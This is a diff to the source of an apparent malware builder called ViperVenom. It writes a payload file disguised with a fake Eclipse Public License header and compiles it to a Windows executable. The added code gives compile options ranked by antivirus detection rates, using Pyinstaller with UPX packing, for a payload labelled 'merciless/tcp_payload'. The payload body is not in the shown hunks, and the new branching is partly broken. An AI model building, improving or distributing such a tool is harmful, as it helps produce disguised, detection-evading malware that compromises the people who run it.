@@ -29,22 +29,14 @@ Clear()
 time.sleep(1)
 def Banner():
     print(f"""{Fore.RED}   
-    Y
-  .-^-.
- /     \      .- ~ ~ -.
-()     ()    /   _ _   `.                     _ _ _
- \_   _/    /  /     \   \                . ~  _ _  ~ .
-   | |     /  /       \   \             .' .~       ~-. `.
-   | |    /  /         )   )           /  /             `.`.
-   \ \_ _/  /         /   /           /  /                `'
-    \_ _ _.'         /   /           (  (
-                    /   /             \  \ 
-                   /   /               \  \ 
-                  /   /                 )  )
-                 (   (                 /  /
-                  `.  `.             .'  /
-                    `.   ~ - - - - ~   .'
-                       ~ . _ _ _ _ . ~s
+      (`-')  _      _  (`-') (`-')  _   (`-')       (`-') (`-')  _<-. (`-')_            <-. (`-')  
+     _(OO ) (_)     \-.(OO ) ( OO).-/<-.(OO )      _(OO ) ( OO).-/   \( OO) )     .->      \(OO )_ 
+,--.(_/,-.\ ,-(`-') _.'    \(,------.,------,),--.(_/,-.\(,------.,--./ ,--/ (`-')----. ,--./  ,-.)
+\   \ / (_/ | ( OO)(_...--'' |  .---'|   /`. '\   \ / (_/ |  .---'|   \ |  | ( OO).-.  '|   `.'   |
+ \   /   /  |  |  )|  |_.' |(|  '--. |  |_.' | \   /   / (|  '--. |  . '|  |)( _) | |  ||  |'.'|  |
+_ \     /_)(|  |_/ |  .___.' |  .--' |  .   .'_ \     /_) |  .--' |  |\    |  \|  |)|  ||  |   |  |
+\-'\   /    |  |'->|  |      |  `---.|  |\  \ \-'\   /    |  `---.|  | \   |   '  '-'  '|  |   |  |
+    `-'     `--'   `--'      `------'`--' '--'    `-'     `------'`--'  `--'    `-----' `--'   `--'
 """)
     print(f"{Fore.BLUE}The quieter you become, the more you can hear, ViperVenom\n")
     print(f"{Fore.RED}                  2{Fore.WHITE} [{Fore.CYAN}Payload Generators{Fore.WHITE}]")
@@ -298,12 +290,7 @@ def PayloadGenerator():
                             ''')
                     if firstHandler == "generate" or firstHandler == "Generate" or firstHandler == "run" or firstHandler == "Run" or firstHandler == "exploit" or firstHandler == "Exploit":
                         print(f"{Fore.BLUE}[*]{Fore.WHITE} Generating Payload")
-                        time.sleep(1)
-                        print(".")
-                        time.sleep(1)
-                        print("..")
-                        time.sleep(1)
-                        print("...")
+                        time.sleep(2)
                         with open(SetFileName, "w") as malfile:
                             malfile.write(f'''
 #Eclipse Public License - v 2.0
@@ -545,14 +532,25 @@ def PTYMEYUXBRwddE():
 PTYMEYUXBRwddE()
 ''')
                             if platform.system() == "Windows":
-                                os.system(f"python setup.py build")
-                                #time.sleep(15)
+                                print(f"{Fore.BLUE}[*]{Fore.WHITE} Choose a Python complier for your ViperVenom payload:")
+                                print(f"{Fore.CYAN}1){Fore.WHITE} CX_Freeze (Less Antivirus detections, comes with DLL/Python-related files in directory, please make sure to edit like 8 and change the YOURFILENAME.py to your payload Python script)")
+                                print(f"{Fore.CYAN}2){Fore.WHITE} Pyinstaller + UPX (More Antivirus detections (4/64 approximately), one exe file")
+                                secHandler = input(f"{Fore.WHITE}{Style.BRIGHT}ViperVenomGen2 {Style.RESET_ALL}{Fore.WHITE}windows{Fore.RED}{Style.BRIGHT}(merciless/tcp_payload){Fore.WHITE}{Style.BRIGHT} > ")
+                                if secHandler == "1" or secHandler == "use 1":
+                                    print(f"{Fore.BLUE}[*]{Fore.WHITE} Please wait while we complie your payload...")
+                                    time.sleep(2)
+                                time.sleep(2)
+                                os.system(f'python setup.py build')
+                                print(f"{Fore.BLUE}[*]{Fore.WHITE} Done Generating Payload.")
+                            if secHandler == "2" or secHandler == "use 2":
+                                os.system(f'pyinstaller {SetFileName} --upx-dir upx-3.96-win64 --noconsole --onefile --clean -i "NONE"')
+                                time.sleep(2)
+                                print(f"{Fore.BLUE}[*]{Fore.WHITE} Done Generating Payload.")
                             if platform.system() == "Linux":
-                                os.system(f"pyinstaller {SetFileName} --onefile")
+                                print(f"{Fore.BLUE}[*]{Fore.WHITE} Done Generating Payload.")
                             else:
                                 pass
-                            time.sleep(2)
-                            print(f"{Fore.BLUE}[*]{Fore.WHITE} Done Generating Payload.")
+                            time.sleep(1)
     except KeyboardInterrupt:
         print(f"{Fore.RED}[-]{Fore.WHITE} ERROR {Fore.GREEN}[REASON]{Fore.WHITE}: Keyboard Interruption.")
         exit()
